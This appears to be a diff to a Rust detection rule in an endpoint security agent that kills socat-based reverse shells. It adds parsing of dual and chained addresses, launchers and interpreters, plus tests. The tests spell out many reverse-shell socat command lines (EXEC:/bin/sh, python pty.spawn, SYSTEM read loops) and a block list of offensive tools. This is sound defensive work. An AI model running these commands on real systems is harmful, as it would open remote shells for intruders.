@@ -25,8 +25,25 @@
 //! recorded at the severity of one that does (Log, Critical), the cut
 //! named, instead of the relay's High record.
 //!
-//! Names are chosen by whoever runs the binary; a renamed tool evades this
-//! rule, which the network and staging rules back up.
+//! Lot 313 (external bug hunt, edition 1.4: BUG-112, BUG-119): one reader
+//! of socat's addresses ([`address_runs_a_shell`]). A dual address
+//! (`STDIO!!EXEC:/bin/sh`) holds two addresses in one argument, and a chain
+//! (socat 1.8: `a|b`) several: each is read. `SYSTEM:` and `SHELL:` run
+//! their command with `/bin/sh -c` (or `$SHELL`): a shell, whatever the
+//! command. `EXEC:` runs its program directly: the program is read past the
+//! launchers in front of it (`env`, `setsid`, `nohup`, `stdbuf`, `timeout`,
+//! `nice`, `ionice`, `chrt`, `taskset`, `sudo`, `doas`, busybox), and a
+//! shell, `script` (which starts one), or an interpreter running inline
+//! code or its standard input (`python3 -c 'import pty;pty.spawn(…)'`, a
+//! REPL; read by the interpreters' one reader) is a shell. The place of
+//! the distribution's socat is the kernel's executed file, never the
+//! caller's string (BUG-119: a string cut at 255 bytes named
+//! `/usr/bin/./././…`); not known, it is no distribution's. And the tool is
+//! named by its `comm` or by the kernel's executed file: a link to
+//! `/usr/bin/socat` under another name is socat.
+//!
+//! Names are chosen by whoever runs the binary; a renamed copy of a tool
+//! evades this rule, which the network and staging rules back up.
 
 use std::sync::Arc;
 
@@ -34,6 +51,7 @@ use nn_model::{Event, ResponseAction, Severity, Verdict};
 
 use crate::config::comm_allowlist::{CommAllowlist, Judgement};
 use crate::decision::attack::{AttackRef, Tactic};
+use crate::decision::rules::program_identity;
 use crate::decision::{rules::build_verdict, Rule};
 use crate::posture::host::PostureHost;
 
@@ -43,11 +61,6 @@ const OFFSEC_COMMS: &[&str] = &["socat", "msfvenom", "meterpreter", "sliver", "h
 /// webroot under `/usr/share` is R010's, and a build in `/usr/local` or
 /// `/opt` is the operator's to allowlist.
 const DISTRIBUTION_BIN_DIRS: &[&str] = &["/usr/bin/", "/bin/", "/usr/sbin/", "/sbin/"];
-
-/// Shells a socat address can run (`EXEC:/bin/sh`, `SYSTEM:bash -i`).
-const SHELLS: &[&str] = &[
-    "sh", "bash", "dash", "zsh", "ksh", "mksh", "ash", "busybox", "fish", "csh", "tcsh",
-];
 
 pub struct R006ReverseShellTooling<H: PostureHost> {
     allowlist: Arc<CommAllowlist<H>>,
@@ -59,25 +72,43 @@ impl<H: PostureHost> R006ReverseShellTooling<H> {
     }
 }
 
-/// A socat address in `argv` runs a shell: `EXEC:`, `SYSTEM:` or `SHELL:`
-/// (any case) whose program — before socat's `,option` list and its own
-/// arguments — is one of [`SHELLS`].
+/// Lot 313 (BUG-112): socat's addresses in `argv` — every argument after
+/// the program's name, a dual address (`a!!b`) split in two and a chain
+/// (`a|b`) in its links.
+fn addresses(argv: &[String]) -> impl Iterator<Item = &str> {
+    argv.iter()
+        .skip(1)
+        .flat_map(|a| a.split("!!"))
+        .flat_map(|a| a.split('|'))
+}
+
+/// One socat address runs a shell (module docs): `SYSTEM:` and `SHELL:`
+/// always; `EXEC:` when its command line does
+/// ([`program_identity::command_runs_a_shell`]). The address type in any
+/// case; the command line up to socat's first `,` (its options).
+fn address_runs_a_shell(address: &str) -> bool {
+    let address = address.trim_start();
+    let Some((kind, rest)) = address.split_once(':') else {
+        return false;
+    };
+    match kind.to_ascii_lowercase().as_str() {
+        "system" | "shell" => true,
+        "exec" => {
+            let command = rest.split(',').next().unwrap_or("");
+            let words: Vec<String> = command
+                .split_whitespace()
+                .map(|w| w.trim_matches(['\'', '"']).to_string())
+                .filter(|w| !w.is_empty())
+                .collect();
+            program_identity::command_runs_a_shell(&words)
+        }
+        _ => false,
+    }
+}
+
+/// A socat address in `argv` runs a shell ([`address_runs_a_shell`]).
 fn socat_runs_a_shell(argv: &[String]) -> bool {
-    argv.iter().skip(1).any(|a| {
-        let a = a.to_ascii_lowercase();
-        let Some(cmd) = ["exec:", "system:", "shell:"]
-            .iter()
-            .find_map(|t| a.strip_prefix(t))
-        else {
-            return false;
-        };
-        let prog = cmd
-            .trim_start_matches(['\'', '"', ' '])
-            .split([',', ' ', '\'', '"'])
-            .next()
-            .unwrap_or("");
-        SHELLS.contains(&prog.rsplit('/').next().unwrap_or(prog))
-    })
+    addresses(argv).any(address_runs_a_shell)
 }
 
 impl<H: PostureHost> Rule for R006ReverseShellTooling<H> {
@@ -109,18 +140,20 @@ impl<H: PostureHost> Rule for R006ReverseShellTooling<H> {
         else {
             return None;
         };
-        if !OFFSEC_COMMS.iter().any(|c| comm == c) {
-            return None;
-        }
+        let tool = program_identity::tool_named(event, OFFSEC_COMMS)?;
         let judgement = super::judge_spawn(&self.allowlist, event);
         if judgement == Judgement::Allowed {
             return None;
         }
         let image = exe.path_or(filename);
-        let distribution = crate::posture::lineage::in_system_tree(image)
-            && DISTRIBUTION_BIN_DIRS.iter().any(|d| image.starts_with(d));
+        // lot 313 (BUG-119): the kernel's executed file, never the caller's
+        // string
+        let distribution = program_identity::kernel_image(event).is_some_and(|k| {
+            crate::posture::lineage::in_system_tree(k)
+                && DISTRIBUTION_BIN_DIRS.iter().any(|d| k.starts_with(d))
+        });
         let cut = super::argv_cut_note(event);
-        let verdict = if comm == "socat" && distribution && !socat_runs_a_shell(argv) {
+        let verdict = if tool == "socat" && distribution && !socat_runs_a_shell(argv) {
             match cut {
                 // External audit EBPF-021: no shell in the part kept is not
                 // "no shell".
@@ -171,7 +204,19 @@ mod tests {
     use crate::posture::host::testing::TestHost as H;
     type CommAllowlist = crate::config::comm_allowlist::CommAllowlist<H>;
     type R006ReverseShellTooling = super::R006ReverseShellTooling<H>;
-    use crate::decision::rules::testutil::{argv_cut, spawn, spawn_exe, spawn_full};
+    use crate::decision::rules::testutil::{argv_cut, kernel_exe, spawn, spawn_exe};
+
+    /// Lot 313 (BUG-119): an exec of `filename` as the LSM hook reports it
+    /// — the distribution's socat is placed by the kernel's path only.
+    fn spawn_full(comm: &str, filename: &str, uid: u32, argv: &[&str], parent_comm: &str) -> Event {
+        kernel_exe(crate::decision::rules::testutil::spawn_full(
+            comm,
+            filename,
+            uid,
+            argv,
+            parent_comm,
+        ))
+    }
 
     fn rule() -> R006ReverseShellTooling {
         R006ReverseShellTooling::new(Arc::new(CommAllowlist::default()))
@@ -343,5 +388,197 @@ mod tests {
             .expect("a copy is not the allowlisted socat");
         assert_eq!(v.action, ResponseAction::KillProcessTree);
         assert!(v.reasoning.contains("named 'socat'"), "{}", v.reasoning);
+    }
+}
+
+/// Lot 313 (external bug hunt, edition 1.4: BUG-112): a socat dual address
+/// (`read!!write`) holds two addresses in one argument;
+/// `socat_runs_a_shell` matched `EXEC:`/`SYSTEM:`/`SHELL:` only at the
+/// start of the argument, and the program as the first word after it.
+#[cfg(test)]
+mod bug112 {
+    use super::*;
+    use crate::decision::rules::testutil::{kernel_exe, spawn_exe, spawn_full};
+    use crate::posture::host::testing::TestHost as H;
+
+    fn judged(args: &[&str]) -> (ResponseAction, Severity) {
+        let e = kernel_exe(spawn_full("socat", "/usr/bin/socat", 1000, args, "bash"));
+        let v = R006ReverseShellTooling::<H>::new(Arc::new(CommAllowlist::<H>::default()))
+            .evaluate(&e)
+            .expect("fires");
+        (v.action, v.severity)
+    }
+
+    fn not_killed(cases: &[&[&str]]) -> Vec<String> {
+        cases
+            .iter()
+            .filter_map(|args| {
+                let got = judged(args);
+                (got != (ResponseAction::KillProcessTree, Severity::Critical))
+                    .then(|| format!("{args:?} -> {got:?}"))
+            })
+            .collect()
+    }
+
+    #[test]
+    fn bug112_dual_address_running_a_shell_is_killed() {
+        let missed = not_killed(&[
+            &["socat", "TCP:10.0.0.1:4444", "STDIO!!EXEC:/bin/sh"],
+            &["socat", "TCP-LISTEN:4444,reuseaddr", "-!!exec:bash -li"],
+            &["socat", "TCP:10.0.0.1:4444", "STDIN!!SHELL:zsh"],
+        ]);
+        assert!(
+            missed.is_empty(),
+            "distribution socat whose dual address runs a shell is not killed: {missed:?}"
+        );
+    }
+
+    /// Beyond the report's fix (`split("!!")`): the shell was matched on
+    /// the first word after `EXEC:`/`SYSTEM:` only — a launcher in front
+    /// of it, or `SYSTEM:` (which always runs `/bin/sh -c`) with another
+    /// first word, still read as a plain relay.
+    #[test]
+    fn bug112_other_shell_spellings_the_report_fix_still_misses() {
+        let missed = not_killed(&[
+            &["socat", "TCP:10.0.0.1:4444", "EXEC:/usr/bin/env sh"],
+            &["socat", "TCP:10.0.0.1:4444", "SYSTEM:exec bash -i"],
+            &["socat", "TCP:10.0.0.1:4444", "EXEC:/usr/bin/setsid bash -i"],
+        ]);
+        assert!(
+            missed.is_empty(),
+            "shell run through a launcher, not killed: {missed:?}"
+        );
+    }
+
+    /// Lot 313's mini-hunt: more spellings of the same shape — a chain's
+    /// link (socat 1.8), a launcher's options and operands, an interpreter
+    /// running inline code or a REPL (`pty.spawn`), `script`, busybox, any
+    /// case, `SYSTEM:` running anything.
+    #[test]
+    fn bug112_variants_are_killed() {
+        let missed = not_killed(&[
+            &["socat", "TCP:h:1", "OPENSSL:h:443|EXEC:/bin/sh"],
+            &[
+                "socat",
+                "TCP:h:1",
+                "EXEC:env -i PATH=/bin bash -i,pty,stderr",
+            ],
+            &["socat", "TCP:h:1", "EXEC:timeout -s KILL 3600 sh"],
+            &["socat", "TCP:h:1", "EXEC:nohup stdbuf -o0 /bin/bash -i"],
+            &[
+                "socat",
+                "TCP:h:1",
+                "EXEC:python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
+            ],
+            &["socat", "TCP:h:1", "EXEC:perl -e 'exec \"/bin/sh\"'"],
+            &["socat", "TCP:h:1", "EXEC:python3,pty"],
+            &["socat", "TCP:h:1", "EXEC:script -qc /bin/bash /dev/null"],
+            &["socat", "TCP:h:1", "EXEC:busybox sh"],
+            &["socat", "TCP:h:1", "Exec:/bin/sh"],
+            &["socat", "TCP:h:1", "SYSTEM:while read c; do $c; done"],
+            &["socat", "TCP:h:1", "system:id"],
+            // a space after the dual address's `!!` (read as socat may)
+            &["socat", "TCP:h:1", "STDIO!! EXEC:/bin/sh"],
+        ]);
+        assert!(missed.is_empty(), "not killed: {missed:?}");
+    }
+
+    /// Guard: a dual relay without a shell stays the relay's record, and so
+    /// does a program that runs no shell, through a launcher or not.
+    #[test]
+    fn bug112_guard_dual_relay_without_a_shell_is_recorded() {
+        for args in [
+            &["socat", "TCP:10.0.0.1:4444", "STDIO!!OPEN:/tmp/log,creat"][..],
+            &["socat", "TCP:h:1", "EXEC:/usr/bin/id"],
+            &[
+                "socat",
+                "TCP:h:1",
+                "EXEC:nohup /usr/bin/tail -f /var/log/syslog",
+            ],
+            &["socat", "TCP:h:1", "EXEC:python3 /srv/relay/main.py"],
+            &["socat", "TCP:h:1", "EXEC:busybox cat"],
+        ] {
+            assert_eq!(
+                judged(args),
+                (ResponseAction::Log, Severity::High),
+                "{args:?}"
+            );
+        }
+    }
+
+    /// Lot 313 (BUG-119 on R006): the distribution's socat is placed by the
+    /// kernel's executed file; the caller's string — a cut one, or any one
+    /// the kernel's path is not known for — places none: a copy's kill.
+    #[test]
+    fn bug119_a_socat_the_kernel_did_not_place_is_no_distribution_s() {
+        let r = R006ReverseShellTooling::<H>::new(Arc::new(CommAllowlist::<H>::default()));
+        let mut cut = spawn_full(
+            "socat",
+            &format!("/usr/bin/{}", "./".repeat(123)),
+            1000,
+            &["socat", "TCP:h:1", "TCP:127.0.0.1:80"],
+            "bash",
+        );
+        if let Event::ProcessSpawn {
+            filename_truncated, ..
+        } = &mut cut
+        {
+            *filename_truncated = true;
+        }
+        let v = r.evaluate(&cut).expect("fires");
+        assert_eq!(v.action, ResponseAction::KillProcessTree, "{}", v.reasoning);
+        let caller_only = spawn_full(
+            "socat",
+            "/usr/bin/socat",
+            1000,
+            &["socat", "TCP:h:1", "TCP:127.0.0.1:80"],
+            "bash",
+        );
+        let v = r.evaluate(&caller_only).expect("fires");
+        assert_eq!(v.action, ResponseAction::KillProcessTree);
+        // the kernel's path: the relay's record
+        let v = r.evaluate(&kernel_exe(caller_only)).expect("fires");
+        assert_eq!(v.action, ResponseAction::Log);
+    }
+
+    /// Lot 313's mini-hunt: a link to the distribution's socat under another
+    /// name has its link's `comm`; the kernel executed socat, and R006
+    /// judges it so — a shell it runs is killed, a relay recorded.
+    #[test]
+    fn a_link_to_socat_under_another_name_is_socat() {
+        let r = R006ReverseShellTooling::<H>::new(Arc::new(CommAllowlist::<H>::default()));
+        let link = |args: &[&str]| {
+            let mut e = spawn_exe("relay", "/home/u/relay", "/usr/bin/socat", 0);
+            if let Event::ProcessSpawn { argv, .. } = &mut e {
+                *argv = args.iter().map(|s| s.to_string()).collect();
+            }
+            r.evaluate(&e).map(|v| (v.action, v.severity))
+        };
+        assert_eq!(
+            link(&["relay", "TCP:h:1", "EXEC:/bin/sh"]),
+            Some((ResponseAction::KillProcessTree, Severity::Critical))
+        );
+        assert_eq!(
+            link(&["relay", "TCP:h:1", "TCP:127.0.0.1:80"]),
+            Some((ResponseAction::Log, Severity::High))
+        );
+        // the lab (12/11, Ubuntu 24.04 and Debian 13): socat 1.8's file is
+        // `/usr/bin/socat1`; a link to it under another name ran its shell
+        // with no record
+        let socat1 = |args: &[&str]| {
+            let mut e = spawn_exe("relay", "/home/u/relay", "/usr/bin/socat1", 0);
+            if let Event::ProcessSpawn { argv, .. } = &mut e {
+                *argv = args.iter().map(|s| s.to_string()).collect();
+            }
+            r.evaluate(&e).map(|v| (v.action, v.severity))
+        };
+        assert_eq!(
+            socat1(&["relay", "TCP:h:1", "EXEC:/bin/sh"]),
+            Some((ResponseAction::KillProcessTree, Severity::Critical))
+        );
+        assert_eq!(
+            socat1(&["relay", "TCP:h:1", "TCP:127.0.0.1:80"]),
+            Some((ResponseAction::Log, Severity::High))
+        );
     }
 }
